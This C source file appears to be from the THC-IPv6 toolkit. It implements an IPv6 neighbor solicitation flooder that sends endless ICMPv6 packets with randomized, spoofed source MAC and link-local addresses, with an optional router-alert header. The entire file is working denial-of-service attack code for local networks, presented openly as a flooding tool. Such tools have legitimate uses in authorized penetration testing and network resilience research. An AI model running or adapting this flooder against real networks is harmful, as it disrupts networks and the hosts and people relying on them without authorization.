#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-k | -m mac] [-a] interface [target [query-address]]\n\n",
         prg);
  printf("Flood the network with neighbor solicitations.\n");
  printf("if not supplied, target is random and query address is ff02::1\n");
  printf(
      "Use -a to add a hopbyhop header with router alert, -k to send with your "
      "real\nmac, -m to specify a mac or its randomized otherwise.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[8] = "", srcmac[8] = "";
  unsigned char *mac6 = mac, *ip6, *query6, *smac = NULL;
  unsigned char  buf[24];
  unsigned char *dst = thc_resolve6("ff02::1"),
                *dstmac = thc_get_multicast_mac(dst), *target = NULL;
  int            i, do_alert = 0, no_spoof = 0;
  unsigned char *pkt = NULL, buf2[6];
  int            pkt_len = 0, rawmode = 0, count = 0;

  if (argc > 1 && strncmp(argv[1], "-a", 2) == 0) {
    do_alert = 1;
    argc--;
    argv++;
  }
  if (argc > 2 && strncmp(argv[1], "-k", 2) == 0) {
    if ((smac = thc_get_own_mac(argv[2])) == NULL) {
      fprintf(stderr, "Error: invalid interface %s\n", argv[2]);
      exit(-1);
    }
    argv++;
    argc--;
  }
  if (argc > 2 && strncmp(argv[1], "-m", 2) == 0) {
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", (unsigned int *)&srcmac[0],
           (unsigned int *)&srcmac[1], (unsigned int *)&srcmac[2],
           (unsigned int *)&srcmac[3], (unsigned int *)&srcmac[4],
           (unsigned int *)&srcmac[5]);
    smac = srcmac;
    argv += 2;
    argc -= 2;
  }
  if (argc > 1 && strncmp(argv[1], "-a", 2) == 0) {
    do_alert = 1;
    argc--;
    argv++;
  }
  if (smac != NULL) mac6 = smac;

  if (argc < 2 || argc > 4 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL)
    printf("WARNING: %s is not working with injection!\n", argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[1];
  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }

  if (argc > 2)
    if ((target = thc_resolve6(argv[2])) == NULL) {
      fprintf(stderr, "Error: Can not resolve %s\n", argv[2]);
      exit(-1);
    }

  query6 = dst;
  if (argc > 3) {
    if ((query6 = thc_resolve6(argv[3])) == NULL) {
      fprintf(stderr, "Error: Can not resolve %s\n", argv[2]);
      exit(-1);
    } else {
      dstmac = thc_get_mac(interface, NULL, query6);
    }
    if (query6[0] < 0xfe && query6[0] >= 0x20) no_spoof = 1;
  }

  if (no_spoof) {
    ip6 = thc_get_own_ipv6(interface, query6, PREFER_GLOBAL);
    memset(ip6 + 8, 0, 8);
  } else {
    ip6 = malloc(16);
    memset(ip6, 0, 16);
    ip6[0] = 0xfe;
    ip6[1] = 0x80;
  }
  ip6[8] = 0x02;
  ip6[9] = mac[1];
  ip6[11] = 0xff;
  ip6[12] = 0xfe;

  mac[0] = 0x00;
  mac[1] = 0x18;
  memset(buf, 0, sizeof(buf));
  buf[16] = 1;
  buf[17] = 1;
  buf[18] = mac[0];
  buf[19] = mac[1];
  if (target != NULL) memcpy(buf, target, 16);

  if (do_alert) {
    memset(buf2, 0, sizeof(buf2));
    buf2[0] = 5;
    buf2[1] = 2;
  }

  printf(
      "Starting to flood network with neighbor solicitations on %s (Press "
      "Control-C to end, a dot is printed for every 1000 packets):\n",
      interface);
  while (1) {
    // use previous src as target if we did not specify a target
    if (target == NULL) memcpy(buf, ip6, 16);

    for (i = 2; i < 6; i++)
      mac[i] = rand() % 256;

    if (no_spoof == 0) {
      ip6[10] = mac[2];
      ip6[13] = mac[3];
      ip6[14] = mac[4];
      ip6[15] = mac[5];
    }
    memcpy(&buf[20], mac + 2, 4);
    count++;

    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                        query6, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (do_alert)
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORSOL, 0, 0, buf, sizeof(buf),
                      0) < 0)
      return -1;
    if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
      //      fprintf(stderr, "Error sending packet no. %d on interface %s: ",
      //      count, interface); perror(""); return -1;
      printf("!");
    }

    pkt = thc_destroy_packet(pkt);
    //    usleep(1);
    if (count % 1000 == 0) printf(".");
  }
  return 0;
}
